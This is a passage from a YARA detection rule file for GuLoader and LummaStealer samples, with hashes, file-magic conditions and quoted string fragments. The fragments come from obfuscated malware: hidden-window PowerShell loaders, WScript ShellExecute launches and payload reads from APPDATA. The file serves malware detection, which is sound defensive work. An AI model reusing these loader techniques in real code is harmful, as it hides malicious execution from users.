      $x2 = "powershell.exe -windowstyle hidden \"spsv uddannnel;function Brudtesna ($teatrali,$nominal=0){ $snuetheadl=3;do {$vertebr+=$teat" ascii /* score: '32.00'*/
      $s3 = " AiAA eAAAX';$svlgede='garrulusun';$snuetheadlndspill='\\Skalka.Pot';Folke (Brudtesna 'mmm$mmmG mmlmmmommmbmmmammmLmm : mmimmmnm" ascii /* score: '12.00'*/
      $s4 = "ali[$snuetheadl];$snuetheadl+=4;$myoxus=Compare-Object taler ingredie}until (!$teatrali[$snuetheadl])$vertebr}function Folke ($f" ascii /* score: '12.00'*/
      $s5 = "**N **e  *R **a **.*.*S** p * L*.*I***t**,(***$*,*S * A **m***M **E **n***f **)');Folke (Brudtesna $compa);$genera=$tintoretto[0" ascii /* score: '11.00'*/
      $s6 = "fft f,Hfff  ff$f.ftff Af fc ffHfff)') ;Folke (Brudtesna '%%%% $%%%%%%G%% %%l%%%%%%o %%%%B%%,%%a%%%%%%l%%%% :%%%%%%U%% %%d%%%%%%s" ascii /* score: '11.00'*/
      $s7 = "ct';$cerut=Brudtesna '+++M++ o,++z+,+i+++l+++l++,a+++/';$kortfi=Brudtesna ' aaTaa.la.asaaa1 aa2';$compa='vvv[v vNvvve vvTvvv.,vv" ascii /* score: '11.00'*/
      $s8 = "___u __S __e___R_ _- __A___G,__E___N___T';$genera=Brudtesna ' .Qh  Qt Q.tQQQp  Qs Q.: QQ/ Q,/  QaQ.QpQQQeQQQxQQQf QQuQ.QrQQQlQQQ" ascii /* score: '8.00'*/
      $s9 = "[0 [[)');Folke (Brudtesna 'fff$fffGfffLfffoff,Bfffa ffl ff:fffi ffnff d,fft ffrf fafffEfffDff.= f.(f fT  fefffsf fT ff- ,fpfffA " ascii /* score: '8.00'*/
      $s10 = "%%%%%%T %%%%i %%%%L%%%%%%L%%%%%%E%%%%%%2%%%%%%0%%%% 1%%%%%%=%%%% $%%%%%%G.%%%%L%%%%%%O%%%%%%B%%%%%%a%%%%%%L%%%%%%: %%%%p %%.A%%%" ascii /* score: '8.00'*/
      $s11 = "msmmmPmmmimm,lmmmL');Folke (Brudtesna '***$ **G***L.**o***B.**a***l  *:***t **i***n  *t**,o** R***E***T***t **O .*=***$***G  *E " ascii /* score: '8.00'*/
      $s12 = "%n%%%%%%t') ;$genera=$tintoretto[$udstille201]}$morphon=439432;$merriamt122=22646;Folke (Brudtesna 'kkk$,kkgkkklkkkOkk bk ka k,L" ascii /* score: '8.00'*/
      $s13 = "KKuKKKt');$specifi=Brudtesna '}}}D}}}o}}}w}}}N';$specifi+=Brudtesna ' **l** o***a***D***f **i***L***e';$resflels=Brudtesna 'www$" ascii /* score: '8.00'*/
      $s14 = "%%%r %%%%e %%%%+%%%% +%% %%%% %%%%$%%%%%%T%%%%%%I %%%%n%%%%%%t.%%%%o%%%%%%R%%%%,e%% %%t  %%t.%%%%O %%%%.%%%%%%C%%%%.O%%%%%%u %%%" ascii /* score: '8.00'*/
      $s15 = "F,,FFF$F FMFFFeFF RFF rFFFI FFA F MF FTFFF1FFF2FFF2  F)');Folke $fugte51;#Trig Amphice Kumulat AngarIEX Tablea Biafra ;\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__3 {
   meta:
      description = "_subset_batch - file GuLoader(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "542564465052b807c5f7bead9b942bdef1894ac1f56623533588c2488422303c"
   strings:
      $x1 = "var Temperat = Rearsufor.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '38.00'*/
      $s2 = "Sagit.ProcessStartupInformation = Temperat;" fullword ascii /* score: '30.00'*/
      $s3 = "var Sagit = Rearsufor.ExecMethod(\"Win32_Process\", \"Create\", Sagit);" fullword ascii /* score: '28.00'*/
      $s4 = "var Sagit = Rearsufor.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s5 = "Sagit.CommandLine = Johan + \" \" + String.fromCharCode(34)+Skovbygg+String.fromCharCode(34);" fullword ascii /* score: '23.00'*/
      $s6 = "//Koggerne spildevandstilladelsens moebler dumpekaraktererne: phytosociologist." fullword ascii /* score: '19.00'*/
      $s7 = "Skovbygg = \"$Vrdie=$env:appdata+'\\\\Heppendes';$Stofskift98=(Get-Item $Vrdie).OpenText().ReadToEnd();$Arbotalu=$Stofskift98[43" ascii /* score: '19.00'*/
      $s8 = "Temperat.ShowWindow = 0;" fullword ascii /* score: '19.00'*/
      $s9 = "Johan = Insipidi.RegRead(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\PowerShell.exe\\\\\");" fullword ascii /* score: '19.00'*/
      $s10 = "var prmie = Insipidi.ExpandEnvironmentStrings(\"%APPDATA%\")+'\\\\Heppendes';" fullword ascii /* score: '18.00'*/
      $s11 = "Skovbygg = \"$Vrdie=$env:appdata+'\\\\Heppendes';$Stofskift98=(Get-Item $Vrdie).OpenText().ReadToEnd();$Arbotalu=$Stofskift98[43" ascii /* score: '18.00'*/
      $s12 = "Lbenu = Lbenu + \"N}}}O}}}L }.,}}}$}}}b} }i } L}}}F }}R}}}a }}G}}}t}}}E }})');Middbubblelta $supbubbler;#AfgangsiEXabusbubbleful" ascii /* score: '18.00'*/
      $s13 = "var Temperat;" fullword ascii /* score: '16.00'*/
      $s14 = "Lbenu = Lbenu + \"XX t X r XXoXX L XXd');Middbubblelta ($advbubblentis);Middbubblelta (Forudstn '.ss$sssbubblessscs.scsssos,sp ." ascii /* score: '16.00'*/
      $s15 = "//Surveyed? ssterselskabs; extempory" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__4 {
   meta:
      description = "_subset_batch - file GuLoader(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7986707b0d2bdad3a3d3a003dfa941782b2d6312b044f6db93f66e99f18d9b53"
   strings:
      $s1 = "25013665.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      all of them
}

rule GuLoader_signature__5 {
   meta:
      description = "_subset_batch - file GuLoader(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "34531320ca306b5d326729a90f1d4f05ec0e47e078a2ecf47b67f5a49a53d01f"
   strings:
      $s1 = "Execute \"Vaporisables.\" + chokoladens & \"Exe\" & chr(99) & \"ute Komplementre,Jordfstelsers,Thyrglobulin,Jonathon ,Distriktsv" ascii /* score: '22.00'*/
      $s2 = "If Bycenterprocessi = cstr(1472920) Then " fullword ascii /* score: '15.00'*/
      $s3 = "Wavier = Wavier + \"Alllllll,l:\"" fullword ascii /* score: '14.00'*/
      $s4 = "Wavier = Wavier + \".Bal';System\"" fullword ascii /* score: '14.00'*/
      $s5 = "Wavier = Wavier + \"!!=!!!,\"" fullword ascii /* score: '13.00'*/
      $s6 = "Wavier = Wavier + \"!e !!!J!\"" fullword ascii /* score: '13.00'*/
      $s7 = "Wavier = Wavier + \"Get-DiskSN\"" fullword ascii /* score: '13.00'*/
      $s8 = "Wavier = Wavier + \"!!R!!!!v \"" fullword ascii /* score: '13.00'*/
      $s9 = "Wavier = Wavier + \"!!!  !!!$!!\"" fullword ascii /* score: '13.00'*/
      $s10 = "Wavier = Wavier + \"O!!!!\"" fullword ascii /* score: '13.00'*/
      $s11 = "Wavier = Wavier + \"!g!!!!\"" fullword ascii /* score: '13.00'*/
      $s12 = "Wavier = Wavier + \"!!!!c!!!\"" fullword ascii /* score: '13.00'*/
      $s13 = "Wavier = Wavier + \"!!C!!!!e!!\"" fullword ascii /* score: '13.00'*/
      $s14 = "Wavier = Wavier + \"!!.p!!!!a\"" fullword ascii /* score: '13.00'*/
      $s15 = "Spytkrllensseksuelles = Spytkrllensseksuelles * (1+1)" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x7553 and filesize < 100KB and
      8 of them
}

rule GuLoader_signature__6 {
   meta:
      description = "_subset_batch - file GuLoader(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ef359edd8f7e64c1582b3072a92cf1cc6e1302ec21454b42133ba3a63692e92f"
   strings:
      $s1 = "scan.exe" fullword ascii /* score: '23.00'*/
      $s2 = "GFGEt?" fullword ascii /* score: '9.00'*/
      $s3 = "* EnRk" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash__3a11ba9d {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_3a11ba9d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3a11ba9d0fe917eca75c6038281c7bd55dea9ce1e0dc1b478d55e2592e6f846f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "entohyal spaulder.exe" fullword wide /* score: '19.00'*/
      $s7 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "GFGEt?" fullword ascii /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00689c1e1439ee823fe34591b0e5f0cc2b6d5c888855dad97efbd78b6032c2ba"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "entohyal spaulder.exe" fullword wide /* score: '19.00'*/
      $s7 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "GFGEt?" fullword ascii /* score: '9.00'*/
      $s10 = "Qircb>=N9" fullword ascii /* score: '9.00'*/
      $s11 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__e2a592076b17ef8bfb48b7e03965a3fc_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_e2a592076b17ef8bfb48b7e03965a3fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6609e0b898a8b4db097bbf18977162cf370b81fc258c7e58dc6ece4619bb055d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "trols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembly" ascii /* score: '25.00'*/
      $s4 = "ency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInv" ascii /* score: '22.00'*/
      $s5 = "baldicoot.exe" fullword wide /* score: '22.00'*/
      $s6 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s7 = "nstall System v3.0</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-" ascii /* score: '13.00'*/
      $s8 = "r\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibil" ascii /* score: '10.00'*/
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__1f23f452093b5c1ff091a2f9fb4fa3e9_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_1f23f452093b5c1ff091a2f9fb4fa3e9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "36876b6fce05638cc1fabd8ca4716233feaebfab40f56ae0180491d77f5f3565"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s8 = "?7{0}\\=;-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'p' */
      $s9 = "* }l(I" fullword ascii /* score: '9.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "hhhqeeeo" fullword ascii /* score: '8.00'*/
      $s12 = "jjjzxxx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__4ea4df5d94204fc550be1874e1b77ea7_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_4ea4df5d94204fc550be1874e1b77ea7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4d4c0f86e62ee85c730519ca25a25f758d647944e8600391287c943083eec2b7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.0rc1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "?76! \"&<" fullword ascii /* score: '9.00'*/ /* hex encoded string 'v' */
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s10 = "nlllfdf" fullword ascii /* score: '8.00'*/
      $s11 = "nfnffll" fullword ascii /* score: '8.00'*/
      $s12 = "rsuzqrt" fullword ascii /* score: '8.00'*/
      $s13 = "pqsgooq" fullword ascii /* score: '8.00'*/
      $s14 = "wwwsesc" fullword ascii /* score: '8.00'*/
      $s15 = "nfllllfdp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "86ebd0f55141cd743ddfb347be75a11565301c0a6eb1aec5961a905d2720dabc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "frizzlers copublishers.exe" fullword wide /* score: '19.00'*/
      $s7 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s8 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s9 = "Qhttp://cacerts.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt0_" fullword ascii /* score: '13.00'*/
      $s10 = "Nhttp://crl3.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crl0 " fullword ascii /* score: '13.00'*/
      $s11 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s12 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s13 = "yrkkjjf" fullword ascii /* score: '8.00'*/
      $s14 = "prnumeration" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__e0e4f2ac {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_e0e4f2ac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e0e4f2ac14f9cf3578fc1bddcb56a21b9330b1f27e2c9414b6050f5f0bd1c4fb"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.16.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "u - Y!i" fullword ascii /* score: '9.00'*/
      $s4 = "RpOdQ- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__1b2bb464 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_1b2bb464.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1b2bb4646b5449aeca6f8f8938530808674b163936191e17972124f99b502d73"
   strings:
      $s1 = "powershell.exe -windowstyle hidden \"spsv sukkerg39;function Klipse ($virks,$lsen=0){ $catach=3;do {$trilo+=$virks[$catach];$cat" ascii /* score: '29.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv sukkerg39;function Klipse ($virks,$lsen=0){ $catach=3;do {$trilo+=$virks[$catach];$cat" ascii /* score: '23.00'*/
      $s3 = "//0///1///  //F/ /i// r///e///f //o///x /// //1///4// 3///. //0';$vaabenl=Klipse 'MMMu MMS.MMEMMMrM,M- MMa,MMG MMEMMMn M T';$sin" ascii /* score: '12.00'*/
      $s4 = "ipse 'AAA$AAAgAA.l AAoA Ab,AAAAAALAAA:AAAf,AAaAAAv AAO  Ar AAI A SAAAeAAA=A.A$A,AE AANAAAVAAA:A,AaAAAP,AAPAAADAAAA .ATA AA AA+ A" ascii /* score: '11.00'*/
      $s5 = "wwewwwSwwwTwww- wwp wwawwwtw wHwww ww.$wwwewwwXw wp w lwwwIwwwcwwwAwwwNww,Swwwawww)');while (!$breakb) {Grafik (Klipse 'xxx$xxxg" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      all of them
}

rule GuLoader_signature__b137b67d {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b137b67d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b137b67d9d570e4c1c8998a7ad2890e1f9c1376658b026fad61d9a79e288e8c1"
   strings:
      $x1 = "Bjemu.ShellExecute(\"explorer.exe\",\"c:\\windows\\system32\\svchost.exe\",\"\",\"open\",0);" fullword ascii /* score: '48.00'*/
      $s2 = "Unsesq.Item(0).Document.Application.ShellExecute(Mask,String.fromCharCode(34)+Automatcaf+String.fromCharCode(34),\"\",\"open\",0" ascii /* score: '21.00'*/
      $s3 = "//Execrating konkursbegring; apostroferet! absents:" fullword ascii /* score: '21.00'*/
      $s4 = "var Processor = -59680;" fullword ascii /* score: '19.00'*/
      $s5 = "var dumpedes = 0xFFFF7BBC;" fullword ascii /* score: '18.00'*/
      $s6 = "var Geninstaller = \"Executer? efterslb\";" fullword ascii /* score: '18.00'*/
      $s7 = "var Anne = Auriculari.ExpandEnvironmentStrings(\"%APPDATA%\")+'\\\\Ambly';" fullword ascii /* score: '18.00'*/
      $s8 = "Comiferouspigletsluppe = Comiferouspigletsluppe - 5494449;" fullword ascii /* score: '17.00'*/
      $s9 = "//Klagetemaet126. imagescanning: pneumatochemical, carabini, opgavesamlinger" fullword ascii /* score: '17.00'*/
      $s10 = "//Alrunes, palilogetic? gryntet" fullword ascii /* score: '17.00'*/
      $s11 = "222B222A22" ascii /* score: '17.00'*/ /* hex encoded string '"+"*"' */
      $s12 = "//Ugestemplende: nonimperialistic: mediaevalise? bevgeapparat" fullword ascii /* score: '16.00'*/
      $s13 = "//Islndingeres: videresalgsmulighed aldringsprocessers!" fullword ascii /* score: '15.00'*/
      $s14 = "//Circumscriptly digebruds" fullword ascii /* score: '15.00'*/
      $s15 = "//Nybblize? gyptologiske! pipedream49!" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__e6924332 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_e6924332.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e692433247c3e15a91fee98d97882ef6aaad27bb24feb0851a7bbb95655d870e"
   strings:
      $x1 = "Config.ShellExecute(Funm,\"c:\\windows\\system32\\svchost.exe\",\"\",\"open\",0);" fullword ascii /* score: '51.00'*/
      $s2 = "Indoktr.Item(0).Document.Application.ShellExecute(Deepened,String.fromCharCode(34)+Blaastempl+String.fromCharCode(34),\"\",\"ope" ascii /* score: '28.00'*/
      $s3 = "Indoktr.Item(0).Document.Application.ShellExecute(Deepened,String.fromCharCode(34)+Blaastempl+String.fromCharCode(34),\"\",\"ope" ascii /* score: '28.00'*/
      $s4 = "//Plainful markjorders? hysteric fortrdelighedernes: lejrudstyret gearvlgernes: collusive! anmeldende skidding: microcolorimeter" ascii /* score: '27.00'*/
      $s5 = "var Blaastempl = \"$Loggiad=$env:appdata+'\\\\Argum';$Porkie=(Get-Item $Loggiad).OpenText().ReadToEnd();$Bejle153=$Porkie[4117.." ascii /* score: '23.00'*/
      $s6 = "//Uncompassability; hemmeligstemplet. severy! deleaved! stationsmesteren, samspilsmnstre rovdyrburs helautomatisering laboratori" ascii /* score: '22.00'*/
      $s7 = "strengede filigree gedebukkeskggene? radikalismens udloesemekanismer superelevation skrferskernes? arbejdsgiveres vedhnget duple" ascii /* score: '21.00'*/
      $s8 = "//Bagbordssider135! salambao sponsorial salacity pigpen. cervicolingual? penthouses separationsbevilling, insidious, kiselgur237" ascii /* score: '20.00'*/
      $s9 = "//Gymnospermous. redistricts! bankeaanden sjlstilstandens oceanologi klenavnet, inanimate holds; superillustrated; futtoget! brn" ascii /* score: '20.00'*/
      $s10 = "//Adducent, tessaraconter; haartoppene: dunner! buffoarie. exheredate batchkoersler sengetiderne, pollage, publicerer airliners!" ascii /* score: '20.00'*/
      $s11 = "//Hypostasised. ankestyrelsen. telegraphoscope! disaccharides, tagpaps funktionslederne, sagomraader, uninjectable postpharyngea" ascii /* score: '19.00'*/
      $s12 = "//Islnderen? swordlet brahminists: telegrafers, typewriters! antidicomarian? skraaleriers bepill163; amphoricity? headlines! bje" ascii /* score: '19.00'*/
      $s13 = "//Anholder? erotiserer canards. scuse: brintionen synkretiske pitchdarkness! brystoperationer chlortetracycline. resultatfils af" ascii /* score: '19.00'*/
      $s14 = "//Hypostasised. ankestyrelsen. telegraphoscope! disaccharides, tagpaps funktionslederne, sagomraader, uninjectable postpharyngea" ascii /* score: '19.00'*/
      $s15 = "//Aerodromes fissirostres alvie diskriminerings? gemmology? acylate eightieth, udlgger; mardil balsameret luminescens! ticketmon" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__9887e744 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_9887e744.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9887e744567fdd5c27954bee4dbfc568bcee5eead952b37c02ddd850247dfaeb"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv afterb;function Vandstan ($nunn,$horationd=0){ $secedi=3;do {$incon+=$nunn[$secedi];$s" ascii /* score: '40.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv afterb;function Vandstan ($nunn,$horationd=0){ $secedi=3;do {$incon+=$nunn[$secedi];$s" ascii /* score: '27.00'*/
      $s3 = "EpE.EoEEEiEEENEEEtEEEmEEEaEEEn ,EAEEEGEEEeEEEREEE]EEE:EEE:EEES E eEEEC  Eu EEREEEiEE TEEEyEEEpE EREEEOEE,t EEOEEEc E,O,EEl EE=EE" ascii /* score: '12.00'*/
      $s4 = "tLttt: ttItttNtttdtttutttstttT ttr ttitt,Ptt R tt  tt=ttt  ttGtttett Tttt- t.ctttO t ntt Ttttet.tnttttttt ttt$ ttEtttb t rt.tA t" ascii /* score: '8.00'*/
      $s5 = "DD:DDDRDDDU DDFDDDODDDu.DD=DDD(DDDTDDDEDDDSDD TDDD- DDPDD ADDDt DDhDD  DDD$DDDeDD,BDDDRDDDaDDDc DD)');while (!$rufou) {Remo251 (" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__9e7c910d {
   meta:
      description = "_subset_batch - file GuLoader(signature)_9e7c910d.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9e7c910d4adb2ecce4d90f308ccd5be555869332a956a25d8fa2a6c49e88eda6"
   strings:
      $s1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Interaccused107 ($lvsav){ $tykkerters=1;do {$procavia114+=$lvsav[$tykk" ascii /* score: '28.00'*/
